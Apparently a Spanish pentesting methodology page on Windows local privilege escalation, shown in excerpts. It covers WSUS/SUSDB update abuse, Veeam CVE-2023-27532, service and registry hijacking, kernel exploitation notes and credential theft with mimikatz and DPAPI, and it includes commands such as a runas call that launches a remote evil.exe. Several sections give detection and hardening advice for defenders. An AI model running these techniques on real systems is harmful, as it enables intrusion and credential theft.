...
Hay diferentes elementos en Windows que podrían **impedirte enumerar el sistema**, ejecutar ejecutables o incluso **detectar tus actividades**. Debes **leer** la siguiente **página** y **enumerar** todos estos **mecanismos de defensa** antes de comenzar la enumeración de la escalada de privilegios:
...
Los procesos UIAccess iniciados mediante `RAiLaunchAdminProcess` pueden abusarse para alcanzar un IL alto sin avisos cuando se omiten las comprobaciones de ruta segura de AppInfo. Consulta aquí el flujo de trabajo específico para omitir la protección del administrador/UIAccess:
...
Las versiones recientes de Windows también introdujeron una vía de LPE mediante **SMB arbitrary-port**, en la que una autenticación NTLM local privilegiada se refleja a través de una conexión TCP SMB reutilizada:
...
### Enumeración de información de la versión

Comprueba si la versión de Windows presenta alguna vulnerabilidad conocida (comprueba también los parches aplicados).
```bash
systeminfo
...
Este [sitio](https://msrc.microsoft.com/update-guide/vulnerability) resulta útil para buscar información detallada sobre vulnerabilidades de seguridad de Microsoft. Esta base de datos contiene más de 4.700 vulnerabilidades de seguridad, lo que muestra la **enorme superficie de ataque** que presenta un entorno Windows.
...
Para habilitar esta opción, sigue las instrucciones de la sección "Transcript files" de la documentación y selecciona **"Module Logging"** en lugar de **"Powershell Transcription"**.
```bash
...
```
Los eventos de registro de Script Block se pueden encontrar en el Visor de eventos de Windows, en la ruta: **Registros de aplicaciones y servicios > Microsoft > Windows > PowerShell > Operational**.\
...
Empieza comprobando si la red utiliza una actualización de WSUS no SSL ejecutando lo siguiente en cmd:
```
...
Para explotar estas vulnerabilidades puedes utilizar herramientas como: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Estos son scripts de exploits MiTM weaponized para inyectar actualizaciones 'fake' en el tráfico WSUS que no utiliza SSL.
...
### Abuso de actualizaciones personalizadas de SUSDB: payloads sin firmar mediante `.txt`/`.esd`

Este es un fallo de trust boundary diferente al de interceptar una conexión HTTP de WSUS: el prerrequisito es disponer de acceso suficiente a los procedimientos almacenados de la base de datos **WSUS (`SUSDB`)** para publicar y aprobar una actualización personalizada. Una vía de entrada práctica consiste en retransmitir la cuenta de equipo de un WSUS upstream a un servidor MSSQL independiente que aloje `SUSDB`; el prerrequisito exacto depende del despliegue, por lo que primero debes enumerar los permisos `EXECUTE` en lugar de asumir derechos de administrador de SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Para la ruta de ataque independiente que retransmite la autenticación de clientes WSUS desde HTTP/8530 a LDAP, SMB o AD CS, consulta [Abusing WSUS HTTP for NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Crear, seleccionar y aprobar la actualización

El workflow de actualización personalizada utiliza procedimientos legítimos de WSUS como una API de publicación restringida. Las transiciones de estado importantes son:<sup>[[38]](#references)</sup>

| Etapa | Procedimientos almacenados relevantes |
| --- | --- |
| Importar los metadatos de la actualización | `spImportUpdate` |
| Almacenar los fragmentos XML de prerrequisitos, localizados y extendidos | `spSaveXMLFragment` |
| Asociar el digest del contenido con la URL controlada por el atacante | `spSetBatchURL` |
| Enumerar/crear un grupo de equipos y añadir el cliente | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Aprobar la instalación para ese grupo | `spDeployUpdate` with `@actionID = 0` and `@isAssigned = 1` |

El nombre del archivo, los digests, el tamaño y el handler `CommandLineInstallation` deben coincidir en los metadatos y fragmentos importados. Después de asignar la URL del contenido y el grupo objetivo, la aprobación final se asemeja a la siguiente; utiliza identificadores nuevos de actualización, grupo y despliegue en lugar de reutilizar los GUID de ejemplo.<sup>[[38]](#references)[[39]](#references)</sup>
```sql
EXEC spDeployUpdate
...
WSUS normalmente rechaza contenido ejecutable arbitrario sin firma. Sin embargo, en `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, la ruta .NET `VerifyFile` establece en false el indicador de comprobación del certificado cuando el nombre de archivo proporcionado termina en `.txt` o `.esd`; después, `CheckCertificateSignature` se omite sin comprobar primero que los bytes sean texto o una imagen ESD legítima. Por lo tanto, un PE sin modificar llamado, por ejemplo, `payload.exe.txt` puede superar la verificación de contenido y posteriormente ser ejecutado por el controlador de instalación de línea de comandos de la actualización. Este es un error de confusión de políticas/tipos, no una falsificación de firma.<sup>[[39]](#references)</sup>
```csharp
...
```
#### Staging y automatización compatibles con BITS

Llamar a `spDeployUpdate` hace que WSUS obtenga el contenido registrado. El origen debe cumplir las expectativas HTTP de BITS: una URL accesible por sí sola no es suficiente, porque la transferencia utiliza un flujo inicial de solicitudes `HEAD`/`GET` y solicitudes de rangos de bytes. Un servidor sin compatibilidad con Range produce el evento de sincronización de WSUS `EventId=364`, indicando que BITS requiere la cabecera de protocolo Range.<sup>[[39]](#references)</sup>

El PoC de investigación [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) genera el SQL necesario para la cadena de importación/fragmento/URL/grupo/despliegue, incluye un cliente MSSQL modificado para ejecutarlo y proporciona `BitsWebServer.py` para el staging del contenido. Una invocación mínima en un laboratorio autorizado es:<sup>[[40]](#references)</sup>
```bash
...
```
#### Ejecución desatendida y persistencia de reintentos

La interacción del lado del cliente depende de la policy. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, opción `4 - Auto download and schedule install`, hace que una actualización aprobada se descargue y se instale según el horario configurado sin que el usuario tenga que seleccionarla manualmente. Durante las pruebas, un payload cuya actualización permanecía fallida/incompleta se volvió a ofrecer inmediatamente después de que el proceso de callback terminara, por lo que el comportamiento de reintento puede convertirse en persistencia de ejecución recurrente; es ruidoso porque el cliente expone un estado de actualización fallida.<sup>[[39]](#references)</sup>

#### Pivotes de detección y hardening

Los pivotes útiles del lado del servidor y del cliente derivados de esta cadena son:<sup>[[39]](#references)</sup>

- Auditar la ejecución de `spCreateTargetGroup`, `spSetBatchURL` y `spDeployUpdate` en `SUSDB`; investigar nuevos grupos de targeting, orígenes de contenido externos, payloads de actualización `.txt`/`.esd` y deployments realizados por principals inesperados (especialmente cuentas que no sean de equipo).
- Revisar `C:\Program Files\Update Services\LogFiles` en busca de `ContentSyncAgent`, `FileVerified`, el error tipográfico `FileVerficationFailed` y `EventId=364`; correlacionar la verificación con la extensión del payload y el content magic en lugar de confiar en el sufijo.
- Buscar instalaciones de Windows Update que fallen/se reintenten repetidamente, así como ejecución de PE o actividad inesperada de procesos secundarios/de red procedente de contenido con nombres `.txt` o `.esd`.
- Requerir Extended Protection for Authentication en el servicio de base de datos cuando sea compatible y restringir el acceso de red a la base de datos al servidor WSUS y a los sistemas administrativos autorizados. Minimizar y auditar los permisos `EXECUTE` sobre los procedimientos de actualización personalizados.

## Auto-Updaters de terceros e IPC de agentes (local privesc)
...
## Veeam Backup & Replication CVE-2023-27532 (SYSTEM vía TCP 9401)

Veeam B&R < `11.0.1.1261` expone un servicio en localhost sobre **TCP/9401** que procesa mensajes controlados por el atacante, lo que permite ejecutar comandos arbitrarios como **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup>

- **Recon**: confirmar el listener y la versión, por ejemplo, `netstat -ano | findstr 9401` y `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: colocar un PoC como `VeeamHax.exe` junto con las DLL requeridas de Veeam en el mismo directorio y, después, activar un payload SYSTEM a través del socket local:
```powershell
...
Existe una vulnerabilidad de **escalada local de privilegios** en entornos de Windows **de dominio** bajo condiciones específicas. Estas condiciones incluyen entornos en los que no se exige la firma de **LDAP**, los usuarios poseen permisos propios que les permiten configurar **Resource-Based Constrained Delegation (RBCD)** y los usuarios pueden crear equipos dentro del dominio. Es importante señalar que estos **requisitos** se cumplen con la configuración predeterminada.
...
**Si** estas 2 claves del registro están **habilitadas** (valor **0x1**), los usuarios con cualquier nivel de privilegios pueden **instalar** (ejecutar) archivos `*.msi` como NT AUTHORITY\\**SYSTEM**.
```bash
...
- Asigna un nombre al proyecto, como **AlwaysPrivesc**, utiliza **`C:\privesc`** como ubicación, selecciona **place solution and project in the same directory** y haz clic en **Create**.
- Sigue haciendo clic en **Next** hasta llegar al paso 3 de 4 (elegir los archivos que se incluirán). Haz clic en **Add** y selecciona el payload Beacon que acabas de generar. Luego haz clic en **Finish**.
...
**Credential Guard** se introdujo en **Windows 10**. Su objetivo es proteger las credenciales almacenadas en un dispositivo frente a amenazas como los ataques pass-the-hash. [**Aquí encontrarás más información sobre Credential Guard.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
...
Comprueba si puedes **sobrescribir algún binario en ejecución** o si tienes permisos de escritura sobre la carpeta del binario para explotar posibles [**ataques de DLL Hijacking**](dll-hijacking/index.html):
```bash
...
```
Comprueba siempre si hay **electron/cef/chromium debuggers** en ejecución; podrías abusar de ellos para escalar privilegios.

**Comprobar los permisos de los binarios de los procesos**
```bash
...
- **WRITE_DAC**: Permite reconfigurar permisos, lo que permite cambiar las configuraciones del servicio.
...
### Permisos débiles de los binarios de los servicios

Si un servicio se ejecuta como **`LocalSystem`**, **`LocalService`**, **`NetworkService`** o una cuenta de dominio con privilegios, pero los usuarios con pocos privilegios pueden modificar el EXE del servicio o su carpeta principal, a menudo es posible secuestrar el servicio **reemplazando el binario y reiniciando el servicio**.
...
```
Busca ACL peligrosas otorgadas a **`Everyone`**, **`BUILTIN\Users`** o **`Authenticated Users`**, especialmente **`(F)`**, **`(M)`** o **`(W)`** sobre el ejecutable del servicio o el directorio que lo contiene. Un flujo práctico de explotación es:<sup>[[27]](#references)</sup>
...
4. Reinicia el servicio con `sc stop <service_name> && sc start <service_name>` (o espera a un reinicio o a un desencadenador del servicio).
...
```
> Si el servicio no permite que un usuario normal lo reinicie, comprueba si se inicia automáticamente al arrancar, tiene una acción ante fallos que lo vuelve a iniciar o puede activarse indirectamente mediante la aplicación que lo utiliza.

### Permisos de modificación del registro de servicios

Debes comprobar si puedes modificar algún registro de servicios.\
Puedes **comprobar** tus **permisos** sobre un **registro** de servicios haciendo lo siguiente:
```bash
...
```
Debe comprobarse si **Authenticated Users** o **NT AUTHORITY\INTERACTIVE** poseen permisos `FullControl`. Si es así, el binario ejecutado por el servicio puede modificarse.

Para cambiar la ruta del binario ejecutado:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Race de symlink de registro para escribir valores arbitrarios en HKLM (ATConfig)

Algunas funciones de accesibilidad de Windows crean claves **ATConfig** por usuario que posteriormente un proceso **SYSTEM** copia en una clave de sesión HKLM. Una **carrera de symlink** del registro puede redirigir esa escritura privilegiada a **cualquier ruta de HKLM**, proporcionando una primitiva de **escritura de valores** arbitrarios en HKLM.<sup>[[18]](#references)</sup>
...
2. Activa la copia al escritorio seguro (por ejemplo, **LockWorkstation**), lo que inicia el flujo del agente AT.
3. **Gana la carrera** colocando un **oplock** en `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; cuando se active el oplock, reemplaza la clave **HKLM Session ATConfig** por un **registry link** hacia un destino protegido de HKLM.
4. SYSTEM escribe el valor elegido por el atacante en la ruta HKLM redirigida.

Una vez que tengas capacidad de escritura arbitraria de valores en HKLM, realiza el pivot a LPE sobrescribiendo valores de configuración de servicios:
...
```
Lista todas las rutas de servicio sin comillas, excluyendo las pertenecientes a servicios integrados de Windows:
```bash
...
Windows permite a los usuarios especificar acciones que se ejecutarán si un servicio falla. Esta función puede configurarse para apuntar a un binario. Si este binario se puede reemplazar, podría ser posible realizar una escalada de privilegios. Puedes encontrar más detalles en la [documentación oficial](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Aplicaciones

### Aplicaciones instaladas

Comprueba los **permisos de los binarios** (tal vez puedas sobrescribir uno y escalar privilegios) y de las **carpetas** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
...
Una forma de encontrar permisos débiles en carpetas/archivos del sistema es:
```bash
...
driverquery /SI
```
Si un driver expone una primitiva arbitraria de lectura/escritura del kernel (algo común en handlers IOCTL mal diseñados), puedes escalar robando directamente un token de SYSTEM desde la memoria del kernel.<sup>[[13]](#references)</sup> Consulta la técnica paso a paso aquí:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Para bugs de race condition en los que la llamada vulnerable abre una ruta de Object Manager controlada por el atacante, ralentizar deliberadamente la búsqueda (usando componentes de longitud máxima o cadenas de directorios profundas) puede ampliar la ventana de microsegundos a decenas de microsegundos:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### UAFs de colas cancel-safe, disclosures de paged-pool y pivotes de I/O ring

Algunas cadenas de LPE del kernel de Windows pueden construirse a partir de dos bugs individualmente débiles: una **race de lifetime en una cancel-safe queue** que libera una request/CBD mientras el lock de la cola sigue retenido, y un disclosure de **lock-release-before-copy** que filtra una asignación liberada de paged-pool durante `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Notas de auditoría y explotación:

- **Free-under-lock + cancel afterwards**: busca una ruta de éxito que haga **Acquire -> CompleteRequest/free -> Release**, mientras que la ruta de cancelación hace **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Si la ruta de éxito llega a `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` antes de liberar el lock de CBDQ/CSQ, un thread bloqueado en `NtCancelIoFileEx -> IopCsqCancelRoutine` puede reanudarse posteriormente y pasar un `PFLT_CALLBACK_DATA` liberado de vuelta al callback de remove del driver.
- **Reclama el objeto de cola liberado** con una asignación de paged-pool del mismo tamaño controlada por el atacante. Las `NPFS` Data Queue Entries son útiles porque el payload y el tamaño son controlables, y posteriormente puedes examinarlas con operaciones de lectura/peek de pipes. Si el objeto liberado contiene list links, sobrescríbelos con una **lista cíclica de fake request nodes en memoria de user** para que el driver procese repetidamente estructuras de request definidas por el atacante en lugar de terminar en el list head original.
- **Mejora un write predecible**: si la fake request redirige un puntero de contexto anidado utilizado por los writes de bookkeeping (timestamps / QPC / campos adyacentes a refcount), puedes obtener un kernel write **controlado por dirección, pero no por valor**. En ese caso, apunta al campo de **length/size** de un objeto de pool sprayed en lugar de a un puntero final de código/datos, y después enumera el spray hasta que el objeto corrupto produzca una **lectura fuera de límites de paged-pool**.
- **Patrón de disclosure raceable**: cualquier syscall que haga `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` es un candidato sólido. La fiabilidad mejora cuando el atacante puede ampliar el buffer copiado (por ejemplo, añadiendo muchas entradas de lista/recurso que incrementen el tamaño final de la asignación del serializer), porque una copia más larga amplía la ventana de reemplazo sin provocar necesariamente el crash de la máquina.
- **Objetivos de refill ricos en punteros**: los arrays de registered-buffer de Windows **I/O ring** son excelentes objetivos de disclosure porque su tamaño en paged-pool está controlado por el atacante (`8 * regBufferCnt`) y cada elemento es un puntero de kernel a un `_IOP_MC_BUFFER_ENTRY`. Filtra uno de estos arrays, recupera el `IORING_OBJECT` circundante y después corrompe **`RegBuffers`** y **`RegBuffersCount`** para que las operaciones posteriores del I/O ring consuman entries falsificadas por el atacante y proporcionen lectura/escritura arbitraria del kernel. Si el único write disponible te proporciona un byte estable (por ejemplo, de `KUSER_SHARED_DATA+0x14`), utiliza **writes unaligned solapados** para construir un puntero de user de bytes repetidos como `0x0101010101010101`, mapéalo con `VirtualAlloc` y coloca allí el array de registered-buffer falsificado.<sup>[[30]](#references)</sup>

Indicadores de debugging útiles:
```text
...
```
Una vez que obtengas lectura/escritura arbitraria del kernel mediante el I/O ring corrupto, roba un token SYSTEM usando el flujo de trabajo estándar posterior a la obtención de la primitive:
...
Las vulnerabilidades modernas de hive permiten preparar layouts deterministas, abusar de descendientes escribibles de HKLM/HKU y convertir la corrupción de metadatos en overflows del paged pool del kernel sin un driver personalizado. Aprende la cadena completa aquí:
...
Algunos drivers aceptan un path del registro desde userland, validan únicamente que sea una cadena UTF-16 válida y después llaman a `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` con `RTL_QUERY_REGISTRY_DIRECT` sobre un escalar del stack como `int readValue`. Si falta `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` se interpreta según el tipo **real** del registro, no según el tipo que esperaba el desarrollador.

Esto crea dos primitives útiles:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: un path absoluto `\Registry\...` controlado por el usuario permite que el driver consulte keys elegidas por el atacante, revele su existencia mediante códigos de retorno/logs y, en ocasiones, lea valores a los que el caller no podría acceder directamente.
- **Corrupción de memoria del kernel**: un destino escalar como `&readValue` se interpreta erróneamente como un `REG_QWORD`, `UNICODE_STRING` o buffer binario de tamaño variable, según el tipo del valor del registro.

Notas prácticas de explotación:

- **Mitigación de Windows 8+**: si la consulta alcanza un **hive no confiable** con `RTL_QUERY_REGISTRY_DIRECT`, pero sin `RTL_QUERY_REGISTRY_TYPECHECK`, los callers del kernel fallan con `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Para mantener la exploitability, busca **keys controladas por el atacante dentro de system hives confiables** en lugar de preparar valores bajo `HKCU`.
- **Staging en un hive confiable**: usa NtObjectManager para enumerar los descendientes escribibles de `\Registry\Machine` y vuelve a ejecutar el scan con un token **low-integrity** duplicado para encontrar keys accesibles desde contextos sandboxed:<sup>[[26]](#references)</sup>
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: una escritura directa de 8 bytes en un `int` de 4 bytes corrompe datos adyacentes de la pila y puede sobrescribir parcialmente un puntero de callback/función cercano.
- **`REG_SZ` / `REG_EXPAND_SZ`**: el modo directo espera que `EntryContext` apunte a un `UNICODE_STRING`. Si el código carga primero un `REG_DWORD` controlado por el atacante en un escalar de la pila y luego reutiliza ese mismo búfer para una lectura de cadena, el atacante controla `Length`/`MaximumLength` e influye parcialmente en el puntero `Buffer`, lo que produce una escritura en el kernel parcialmente controlada.
- **`REG_BINARY`**: para datos binarios grandes, el modo directo trata el primer `LONG` en `EntryContext` como un tamaño de búfer con signo. Si una lectura previa de `REG_DWORD` deja un valor negativo controlado por el atacante en el escalar reutilizado, la siguiente consulta `REG_BINARY` copia bytes del atacante directamente sobre las ranuras adyacentes de la pila, lo que suele ser el camino más limpio para sobrescribir completamente un puntero de callback.

Patrón de hunting sólido: **lecturas heterogéneas del registro en la misma variable de la pila sin reinicializarla**. Busca `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, punteros `EntryContext` reutilizados y rutas de código en las que la primera lectura del registro controle si se realiza una segunda lectura.
...
Una vez que un usuario puede abrir el dispositivo, los IOCTL privilegiados expuestos por el driver pueden abusarse para LPE y tampering. Ejemplos de capacidades observadas en la práctica:
- Devolver handles con acceso total a procesos arbitrarios (robo de tokens / shell SYSTEM mediante DuplicateTokenEx/CreateProcessAsUser).
- Lectura/escritura raw sin restricciones del disco (tampering offline, técnicas de persistencia durante el arranque).
...
Patrón de PoC mínimo (user mode):
```c
...
- Restringe los IOCTLs (access masks, METHOD_*, validación de entradas) y considera modelos brokered en lugar de privilegios directos del kernel.

Ideas de detección para defenders
- Monitoriza las aperturas desde user-mode de nombres de dispositivos sospechosos (p. ej., \\ .\\amsdk*) y secuencias específicas de IOCTLs indicativas de abuso.
- Aplica la vulnerable driver blocklist de Microsoft (HVCI/WDAC/Smart App Control) y mantén tus propias listas de allow/deny.


## PATH DLL Hijacking

Si tienes **permisos de escritura dentro de una carpeta presente en PATH**, podrías ser capaz de hijackear una DLL cargada por un proceso y **escalar privilegios**.<sup>[[2]](#references)</sup>

Comprueba los permisos de todas las carpetas incluidas en PATH:
```bash
...
## Hijacking de resolución de módulos de Node.js / Electron mediante `C:\node_modules`

Esta es una variante de **uncontrolled search path** de **Windows** que afecta a aplicaciones de **Node.js** y **Electron** cuando realizan un import desnudo como `require("foo")` y falta el módulo esperado.<sup>[[20]](#references)</sup>

Node resuelve los paquetes recorriendo el árbol de directorios y comprobando las carpetas `node_modules` de cada directorio padre. En Windows, ese recorrido puede llegar a la raíz de la unidad, por lo que una aplicación iniciada desde `C:\Users\Administrator\project\app.js` puede terminar buscando:<sup>[[21]](#references)</sup>
...
Si un **usuario con pocos privilegios** puede crear `C:\node_modules`, puede colocar un `foo.js` malicioso (o una carpeta de paquete) y esperar a que un **proceso de Node/Electron con mayores privilegios** resuelva la dependencia ausente. El payload se ejecuta en el contexto de seguridad del proceso víctima, por lo que esto se convierte en **LPE** cuando el objetivo se ejecuta como administrador, desde una tarea programada elevada/un service wrapper o desde una aplicación de escritorio privilegiada iniciada automáticamente.
...
- el `require()` vulnerable se encuentra en un nivel profundo del árbol de dependencias en lugar de estar en el código principal de la aplicación
...
- Concéntrate en `NAME NOT FOUND` y en la apertura exitosa final bajo `C:\node_modules`
...
mkdir C:\node_modules
```
3. Deja un módulo con el nombre exacto esperado:
```javascript
// C:\node_modules\foo.js
...
Ejemplos del mundo real de módulos opcionales ausentes que encajan con este patrón incluyen `bluebird` y `utf-8-validate`, pero la **técnica** es la parte reutilizable: encuentra cualquier **missing bare import** que un proceso privilegiado de Windows basado en Node/Electron vaya a resolver.

### Ideas para la detección y el hardening

- Genera alertas cuando un usuario cree `C:\node_modules` o escriba nuevos archivos/paquetes `.js` allí.
...
- Desactiva las comprobaciones opcionales cuando la biblioteca lo permita (por ejemplo, algunas implementaciones de `ws` pueden evitar la comprobación heredada de `utf-8-validate` mediante `WS_NO_UTF_8_VALIDATE=1`).
...
Comprueba si hay otros equipos conocidos codificados directamente en el archivo hosts
```
...
Más[ comandos para la enumeración de la red aquí](../basic-cmd-for-pentesters.md#network)
...
Si obtienes el usuario root, puedes escuchar en cualquier puerto (la primera vez que uses `nc.exe` para escuchar en un puerto, se te preguntará mediante una GUI si `nc` debe permitirse en el firewall).
```bash
wsl whoami
...
Windows Vault almacena las credenciales de usuario para servidores, sitios web y otros programas que **Windows** puede usar para **iniciar sesión automáticamente para los usuarios**. Al principio, esto podría parecer indicar que los usuarios pueden almacenar las credenciales de sitios como Facebook, Twitter o Gmail y hacer que los navegadores inicien sesión automáticamente, pero no funciona así.

Windows Vault almacena credenciales con las que Windows puede iniciar sesión automáticamente para los usuarios, lo que significa que cualquier **aplicación de Windows que necesite credenciales para acceder a un recurso** (servidor o sitio web) **puede utilizar este Credential Manager** y Windows Vault, y usar las credenciales proporcionadas en lugar de que los usuarios introduzcan el nombre de usuario y la contraseña todo el tiempo.

A menos que las aplicaciones interactúen con Credential Manager, no creo que puedan utilizar las credenciales para un recurso determinado. Por lo tanto, si tu aplicación quiere utilizar el vault, debería **comunicarse de alguna manera con el administrador de credenciales y solicitar las credenciales para ese recurso** al vault de almacenamiento predeterminado.
...
```
Luego puedes usar `runas` con las opciones `/savecred` para utilizar las credenciales guardadas. El siguiente ejemplo llama a un binario remoto mediante un recurso compartido SMB.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Usar `runas` con un conjunto de credenciales proporcionado.
```bash
...
Las claves RSA de usuario cifradas mediante DPAPI se almacenan en el directorio `%APPDATA%\Microsoft\Protect\{SID}`, donde `{SID}` representa el [Identificador de seguridad](https://en.wikipedia.org/wiki/Security_Identifier) del usuario. **La clave DPAPI, ubicada junto con la clave maestra que protege las claves privadas del usuario en el mismo archivo**, normalmente consta de 64 bytes de datos aleatorios. (Es importante señalar que el acceso a este directorio está restringido, lo que impide enumerar su contenido mediante el comando `dir` en CMD, aunque sí puede enumerarse mediante PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Puedes usar el **mimikatz module** `dpapi::masterkey` con los argumentos apropiados (`/pvk` o `/rpc`) para descifrarla.

Los **credentials files protegidos por la contraseña maestra** suelen encontrarse en:
```bash
...
```
Puedes usar el **módulo de mimikatz** `dpapi::cred` con el `/masterkey` apropiado para descifrar.\
...
Las **credenciales de PowerShell** se utilizan a menudo para tareas de **scripting** y automatización, como una forma práctica de almacenar credenciales cifradas. Las credenciales están protegidas mediante **DPAPI**, lo que normalmente significa que solo pueden ser descifradas por el mismo usuario en el mismo equipo en el que se crearon.
...
Las claves privadas SSH pueden almacenarse dentro de la clave de registro `HKCU\Software\OpenSSH\Agent\Keys`, por lo que deberías comprobar si hay algo interesante allí:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Si encuentras alguna entrada dentro de esa ruta, probablemente será una clave SSH guardada. Se almacena cifrada, pero se puede descifrar fácilmente usando [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
...
Busca estos archivos en `C:\ProgramData\Microsoft\Group Policy\history` o en _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (antes de W Vista)_:
...
Siempre puedes **pedirle al usuario que introduzca sus credenciales o incluso las credenciales de otro usuario** si crees que puede conocerlas (ten en cuenta que **pedir** directamente al cliente las **credenciales** es realmente **arriesgado**):
```bash
...
Deberías buscar dbs donde se almacenen las passwords de **Chrome o Firefox**.\
Busca también el historial, los marcadores y los favoritos de los browsers, ya que quizá haya algunas **passwords** almacenadas allí.

Tools para extraer passwords de los browsers:
...
Las clases e interfaces COM están definidas en el registry, bajo **HKEY\CLASSES\ROOT\CLSID** y **HKEY\CLASSES\ROOT\Interface**, respectivamente. Este registry se crea fusionando **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Dentro de los CLSIDs de este registry puedes encontrar el registry hijo **InProcServer32**, que contiene un valor predeterminado que apunta a una **DLL** y un valor llamado **ThreadingModel**, que puede ser **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) o **Neutral** (Thread Neutral).

![Browsers History - COM DLL Overwriting: Dentro de los CLSIDs de este registry puedes encontrar el registry hijo InProcServer32, que contiene un valor predeterminado que apunta a una DLL y un valor...](<../../images/image (729).png>)

Básicamente, si puedes **sobrescribir cualquiera de las DLLs** que se vayan a ejecutar, podrías **escalate privileges** si dicha DLL va a ser ejecutada por un usuario diferente.
...
Imagina que **un proceso ejecutándose como SYSTEM abre un proceso nuevo** (`OpenProcess()`) **con full access**. El mismo proceso **también crea un proceso nuevo** (`CreateProcess()`) **con pocos privilegios, pero heredando todos los handles abiertos del proceso principal**.\
Entonces, si tienes **full access al proceso con pocos privilegios**, puedes obtener el **handle abierto al proceso privilegiado creado** con `OpenProcess()` e **inyectar un shellcode**.\
...
[Lee también **esta otra publicación para obtener una explicación más completa sobre cómo probar y abusar de más handlers abiertos de procesos y threads heredados con diferentes niveles de permisos (no solo full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).
...
Windows proporciona una funcionalidad denominada **Named Pipes**, que permite a procesos no relacionados compartir datos, incluso a través de distintas redes. Esto se parece a una arquitectura cliente/servidor, con roles definidos como **named pipe server** y **named pipe client**.

Cuando un **client** envía datos a través de un pipe, el **server** que configuró el pipe puede **adoptar la identidad** del **client**, siempre que tenga los permisos **SeImpersonate** necesarios. Identificar un **proceso privilegiado** que se comunique mediante un pipe que puedas imitar ofrece la oportunidad de **obtener mayores privilegios**, adoptando la identidad de ese proceso cuando interactúe con el pipe que estableciste. Para obtener instrucciones sobre cómo ejecutar este ataque, puedes consultar guías útiles [**aquí**](named-pipe-client-impersonation.md) y [**aquí**](#from-high-integrity-to-system).
...
- Cada evento escribe el `InitContext` controlado por el atacante de `Initialize` en ese handle. Registra una aplicación de línea con `LRegisterRequestRecipient` (`Req_Func 61`), activa `TRequestMakeCall` (`Req_Func 121`), obtiene los datos mediante `GetAsyncEvents` (`Req_Func 0`) y, finalmente, anula el registro o cierra el servicio para repetir escrituras deterministas.
...
Los enlaces Markdown en los que se puede hacer clic y que se reenvían a `ShellExecuteExW` pueden activar handlers de URI peligrosos (`file:`, `ms-appinstaller:` o cualquier esquema registrado) y ejecutar archivos controlados por el atacante como el usuario actual. Consulta:
...
Esto permite escalar privilegios y evadir UAC al mismo tiempo mediante la misma vulnerabilidad. Además, no es necesario instalar nada y el binario utilizado durante el proceso está firmado y publicado por Microsoft.
...
## De la eliminación/movimiento/renombrado arbitrario de carpetas a SYSTEM EoP

La técnica descrita [**en esta publicación del blog**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), con el código de exploit [**disponible aquí**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

El ataque consiste básicamente en abusar de la función de rollback de Windows Installer para reemplazar archivos legítimos por archivos maliciosos durante el proceso de desinstalación. Para ello, el atacante necesita crear un **instalador MSI malicioso** que se utilizará para secuestrar la carpeta `C:\Config.Msi`, que posteriormente Windows Installer usará para almacenar archivos de rollback durante la desinstalación de otros paquetes MSI, cuyos archivos de rollback se habrán modificado para contener el payload malicioso.

La técnica resumida es la siguiente:

1. **Fase 1 – Preparación del hijacking (dejar `C:\Config.Msi` vacía)**
...
- Paso 4: Bloquear la eliminación del `.rbf`
...
- Windows Installer no puede eliminar el `.rbf` y, como no puede eliminar todo el contenido, no elimina `C:\Config.Msi`.
...
2. **Fase 2 – Reemplazar los scripts de rollback por scripts maliciosos**

